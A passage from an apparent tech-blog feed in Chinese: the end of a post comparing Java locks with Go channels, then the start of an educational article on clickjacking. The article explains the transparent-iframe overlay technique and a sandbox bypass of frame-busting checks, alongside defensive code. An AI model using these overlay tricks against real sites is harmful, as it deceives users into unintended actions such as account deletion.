class=\"token operator\">=</span>lock<span class=\"token punctuation\">.</span><span class=\"token function\">newCondition</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">var</span> size <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">var</span> producer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                        con<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">var</span> item <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span><br>                queue<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce : \"</span> <span class=\"token operator\">+</span> item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                con<span class=\"token punctuation\">.</span><span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            producer<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">var</span> consumer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                        con<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">var</span> item <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume : \"</span> <span class=\"token operator\">+</span> item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                con<span class=\"token punctuation\">.</span><span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            consumer<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span></code></pre>\n<p>生產者和消費者透過 queue 溝通，每次往 queue 新增/刪除資料時，都會先用 lock 保護，確保一次只有一個 thread 能存取 queue。<br>\nThread &amp; Lock 基本上完全模擬了底層硬體處理並行的行為，且大部分程式語言都有支援，因此可以廣泛應用在大多數的場景。<br>\n但是 Thread &amp; Lock 很難寫好，不小心會造成 deadlock。如以下的 code：</p>\n<pre class=\"language-java\"><code class=\"language-java\">    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> cacheLock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> tableLock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>cacheLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>tableLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hio1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>tableLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>cacheLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hio2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">public</span>  <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>                <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>                <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span></code></pre>\n<p>20 行的 Thread 和 25 行的 Thread 彼此等待對方的鎖，讓程式卡住。<br>\n而更棘手的是 deadlock 通常不容易發現。想像一下上面的 code：若是 <strong>oneMethod</strong> 和 <strong>anotherMethod</strong> 是第三方套件提供的方法，除非你 trace 過 code，不然你無法確保該 method 裡面是否有使用到 lock。甚至有可能在例外處理中忘記解鎖導致系統 deadlock。</p>\n<h2 id=\"communicating-sequential-process(csp)\"><a class=\"direct-link\" href=\"#communicating-sequential-process(csp)\">#</a> Communicating Sequential Process(CSP)</h2>\n<p>相較於多個 Thread 透過共享記憶體溝通的 Threa &amp; Lock 典範，CSP 提倡透過溝通來共享資訊。概念上如下圖，每個 Thread 透過 channel 發送/接收訊息來溝通：</p>\n<p><img src=\"/img/posts/genchilu/concurrency_paradigms_golang_and_Java/csp.png\" alt=\"\"></p>\n<p>Golang 的並行典範則是圍繞著 CSP 概念設計，<a href=\"https://go.dev/blog/codelab-share\">Golang 官方 blog</a> 提到:</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.<br>\n不要透過共享記憶體溝通，透過溝通來共享記憶體。</p>\n</blockquote>\n<p>同時你可以在 Golang Sysn Package 的文件中看到下列敘述：</p>\n<blockquote>\n<p>Package sync provides basic synchronization primitives such as mutual exclusion locks. Other than the Once and WaitGroup types, most are intended for use by low-level library routines. Higher-level synchronization is better done via channels and communication.<br>\nPackage sync 提供基礎的同步原型，像是互斥鎖。除了 Once 和 WaitGroup 以外，大部分都是提供用來做底層 library 使用。高階的同步建議使用 channel 。</p>\n</blockquote>\n<p>因此若是用 Golang 解決生產者/消費者問題時，程式寫起來會像這樣：</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tqueue <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token comment\">// producer</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t\titem <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Intn</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><br>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce: %d\\n\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">)</span><br>\t\t\tqueue <span class=\"token operator\">&lt;-</span> item<br>\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\t<span class=\"token comment\">// consumer</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t\titem <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>queue<br>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume: %d\\n\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br><span class=\"token punctuation\">}</span></code></pre>\n<p>可以看到 Golang 將複雜的互斥鎖邏輯封裝在 channel 裡面，開發者可以安心地使用 channel 而不用分心 Lock &amp; Unlock 的邏輯。以更高位的角度來看，可以說是 Golang 鼓勵開發者用 Channel 把所有 Goroutine 解耦合，也就是 CSP 的理念。反之 Thread &amp; Lock 會把所有 thread 用 shared memory 耦合在一起。 <br>\n但這是有代價的 - 為了達到 Goroutine 間不共享記憶體，channel 在實作上並不是把 sender 的物件直接透過 channel 傳給 receiver，而是傳遞一個 copy 的物件，可以用下面這段 code 驗證：</p>\n<pre class=\"language-go\"><code class=\"language-go\">\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\titem <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Intn</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce item Addr: %v\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>item<span class=\"token punctuation\">)</span><br>\t\tqueue <span class=\"token operator\">&lt;-</span> item<br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\titem <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>queue<br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume item Addr: %v\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>item<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>實際 print 到銀幕上的記憶體位置會不一樣：</p>\n<pre class=\"language-text\"><code class=\"language-text\">roduce item Addr: 0xc000014090<br>Consume item Addr: 0xc000120000</code></pre>\n<p>而每個物件都需要 copy 在效能上是一定會有損耗的，這就是用 channel 把 goroutine 解耦合要付出的代價。</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>當我們說 Java 的並行是以 Thread &amp; Lock 為基底，並不代表 Java 不能做到 CSP。以生產者/消費者的範例來看， Java 用 BlockingQueue 可以做到類似 Golang 的 channel 的功能。同理，Golang 中也有提供的  sync package 不乏有 Mutex、RWMutex 等機制。<br>\n但在 Java 中你會看到 Java 的並行生態系會是環繞著 Thread &amp; Locl 去打造，你會看到大量的 synchronized 去規範某個區段一次只能被一個 Thread 執行，你會看到 Java 文章常提到要 Thread-safe 等概念。而在 Golang 你更多的是看到怎麼運用 select &amp; channel 去打造並行程式。<br>\n在下一篇文章中，我會介紹 Golang 官網介紹的幾種常見的 Concurrency Pattern，以及對應 Java 的寫法做比較，讓大家可以更深刻體會兩種並行典範的內涵差異。</p>\n<h2 id=\"reference\"><a class=\"direct-link\" href=\"#reference\">#</a> Reference</h2>\n<p><a href=\"https://www.youtube.com/watch?v=KBZlN0izeiY\">GopherCon 2017: Kavya Joshi - Understanding Channels</a><br>\n<a href=\"https://pragprog.com/titles/pb7con/seven-concurrency-models-in-seven-weeks/\">Seven Concurrency Models in Seven Weeks When Threads Unravel</a></p>\n",
      "date_published": "2021-08-29T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/clickjacking-intro/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/clickjacking-intro/",
      "title": "不識廬山真面目：Clickjacking 點擊劫持攻擊",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>在針對前端的各種攻擊手法之中，我覺得 clickjacking 是相當有趣的一個。它的中文翻譯通常翻成「點擊劫持」，實際上的意思是你以為點了 A 網頁的東西，其實卻是點到了 B 網頁，惡意網頁劫持了使用者的點擊，讓使用者點到意料之外的地方。</p>\n<!-- summary -->\n<p>只是一個點擊而已，這樣會有什麼危害嗎？</p>\n<p>假設在背後的是一個銀行轉帳頁面，而且帳號跟金額都填好了，只要按一個按鈕就會轉錢出去，這樣的話危害就很大了（不過這通常不太可能啦，因為轉帳還需要輸入 OTP 之類的，這只是舉例）。</p>\n<p>或是舉個更常見的例子，例如說有個乍看之下是取消訂閱電子報的頁面，於是你點了「確定取消」的按鈕，但其實底下藏著的是 Facebook 的按讚鈕，所以你不但沒有取消訂閱，還被騙了一個讚（因為劫持的目標是讚，所以又稱為 likejacking）。</p>\n<p>這篇文章我會介紹 clickjacking 的攻擊原理、防禦方式以及實際案例，讓大家更了解這個攻擊手法。</p>\n<h2 id=\"clickjacking-%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86\"><a class=\"direct-link\" href=\"#clickjacking-%E6%94%BB%E6%93%8A%E5%8E%9F%E7%90%86\">#</a> Clickjacking 攻擊原理</h2>\n<p>Clickjacking 的原理就是把兩個網頁疊在一起，透過 CSS 讓使用者看見的是 A 網頁，但點到的卻是 B 網頁。</p>\n<p>以比較技術的講法來說，就是用 iframe 把 B 網頁嵌入然後設透明度 0.001，再用 CSS 把自己的內容疊上去，就大功告成了。</p>\n<p>我覺得 clickjacking 直接看範例是最有趣的，因此做了一些簡單的範例。</p>\n<p>底下這個範例可以先點擊「確定取消」的按鈕，然後再點「切換透明度」，就可以看到背後其實是修改個人資料的頁面以及刪除帳號的按鈕：</p>\n<iframe src=\"https://aszx87410.github.io/demo/clickjacking/\" width=\"320\" height=\"430\"></iframe>\n<p>所以我以為我點了「確定取消」，但實際上點到的卻是「刪除帳號」，這就是 clickjacking。</p>\n<p>上面的 iframe 如果打不開，可以去這邊玩：<a href=\"https://aszx87410.github.io/demo/clickjacking/\">clickjacking 範例</a>。</p>\n<p>有些人可能會覺得這個範例太過簡單，實際應用中可能很少出現這種這麼簡單的攻擊，只要按一個按鈕而已，或許更多網站會更複雜一點，例如說要先輸入一個什麼東西？</p>\n<p>底下這個範例以「更改 email」這個功能來設計 clickjacking，比起前一個範例是整個網頁蓋過去，這個範例刻意留下原網頁的 input，其他都用 CSS 蓋掉，按鈕的部分用 <code>pointer-events:none</code> 讓事件穿透。</p>\n<p>看似是一個輸入 email 訂閱資訊的網頁，但按下確定之後卻跳出「修改 email 成功」，因為背後其實是個修改 email 的網頁：</p>\n<iframe src=\"https://aszx87410.github.io/demo/clickjacking/adv.html\" width=\"340\" height=\"450\"></iframe>\n<p>上面的範例沒看到的話，可以去這邊玩：<a href=\"https://aszx87410.github.io/demo/clickjacking/adv.html\">進階 clickjacking 範例</a>。</p>\n<p>除此之外，我也有在<a href=\"https://blog.miniasp.com/post/2008/10/11/The-latest-cross-browser-exploit-Clickjacking\">最新的跨瀏覽器攻擊手法：Clickjacking</a> 這篇裡面看到一個很有趣的範例：<a href=\"https://www.youtube.com/watch?v=gxyLbpldmuU\">假遊戲真劫持（YouTube 影片）</a>，看似是遊戲但其實只是為了讓你去點按鈕，超級有趣！</p>\n<p>寫到這邊，幫 clickjacking 做個總結，這個攻擊手法大概就是：</p>\n<ol>\n<li>把目標網頁嵌入惡意網頁之中（透過 iframe 或其他類似標籤）</li>\n<li>在惡意網頁上用 CSS 把目標網頁蓋住，讓使用者看不見</li>\n<li>誘導使用者前往惡意網頁並且做出操作（輸入或點擊等等）</li>\n<li>觸發目標網頁行為，達成攻擊</li>\n</ol>\n<p>因此實際上攻擊的難易度，取決於你的惡意網站設計得怎麼樣，以及目標網頁的原始行為需要多少互動。舉例來說，點擊按鈕就比輸入資訊要容易得多。</p>\n<p>然後還要提醒一點，這種攻擊要達成，使用者要先在目標網站是登入狀態才行。只要能把目標網頁嵌入惡意網頁之中，就會有 clickjacking 的風險。</p>\n<h2 id=\"clickjacking-%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#clickjacking-%E9%98%B2%E7%A6%A6%E6%96%B9%E5%BC%8F\">#</a> Clickjacking 防禦方式</h2>\n<p>如同前面所述，只要能被其他網頁嵌入就會有風險，換句話說，如果沒辦法被嵌入，就不會有 clickjacking 的問題了，這就是解決 clickjacking 的方式。</p>\n<p>一般來說點擊劫持的防禦方式可以分為兩種，一種是自己用 JavaScript 檢查，另一種是透過 response header 告知瀏覽器這個網頁是否能被嵌入。</p>\n<h3 id=\"frame-busting\"><a class=\"direct-link\" href=\"#frame-busting\">#</a> Frame busting</h3>\n<p>有一種叫做 frame busting 的方式，就是我前面提到的自己用 JavaScript 檢查，原理很簡單，程式碼也很簡單：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>top <span class=\"token operator\">!==</span> self<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>  top<span class=\"token punctuation\">.</span>location <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>location<br><span class=\"token punctuation\">}</span></code></pre>\n<p>每一個網頁都有自己的 window object，而 <code>window.self</code> 指向的會是自己的 window，那 top 的話就是 top window，可以想成是這整個瀏覽器的「分頁」最上層的 window。</p>\n<p>如果今天是被獨立開啟的網頁，那 top 跟 self 就會指向同一個 window，但如果今天網頁是被鑲在 iframe 裡面，top 指的就會是使用 iframe 的那個 window。</p>\n<p>舉個例子好了，假設今天我在 localhost 有個 index.html，裡面寫著：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://example.com<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://onedegree.hk<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>iframe</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>那關係圖就會是這樣：</p>\n<p><img src=\"/img/posts/huli/clickjacking-intro/top.png\" alt=\"window 關係圖\"></p>\n<p>綠色跟黃色分別是兩個以 iframe 載入的網頁，也就是兩個不同的 window，在這兩個網頁裡面如果存取 <code>top</code> 的話，就會是 <code>localhost/index.html</code> 的 window object。</p>\n<p>所以透過 <code>if (top !== self)</code> 的檢查，就可以知道自己是不是被放在 iframe 裡面。如果是的話，就改變 top.location，把最上層的網頁導向其他地方。</p>\n<p>聽起來很美好而且沒什麼問題，但其實會被 iframe 的 <code>sandbox</code> 屬性繞過。</p>\n<p>iframe 可以設置一個屬性叫做 <code>sandbox</code>，代表這個 iframe 的功能受到限制，如果要把限制打開必須明確指定，可以指定的值包括：</p>\n<ol>\n<li>allow-forms，允許提交表單</li>\n<li>allow-scripts，允許執行 JS</li>\n<li>allow-top-navigation，允許改變 top location</li>\n<li>allow-popups，允許彈出視窗</li>\n</ol>\n<p>（還有一大堆，詳情可參考 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe\">MDN: iframe</a>）</p>\n<p>也就是說，如果我是這樣載入 iframe 的：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>iframe</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>./busting.html<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">sandbox</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>allow-forms allow-scripts<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></code></pre>\n<p>那就算 busting.html 有上面我說的那個防護也沒有用，因為 JavaScript 不會執行，所以那段 script 就不會跑到，但 user 還是可以正常 submit 表單。</p>\n<p>於是就有人提出了更實用的方法，在現有基礎上做一些改良（程式碼取自：<a href=\"https://en.wikipedia.org/wiki/Framekiller\">Wikipedia - Framekiller</a>）：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"><span class=\"token selector\">html</span><span class=\"token punctuation\">{</span><span class=\"token property\">display</span><span class=\"token punctuation\">:</span>none<span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>self <span class=\"token operator\">==</span> top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>       document<span class=\"token punctuation\">.</span>documentElement<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>display <span class=\"token operator\">=</span> <span class=\"token string\">'block'</span><span class=\"token punctuation\">;</span> <br>   <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token 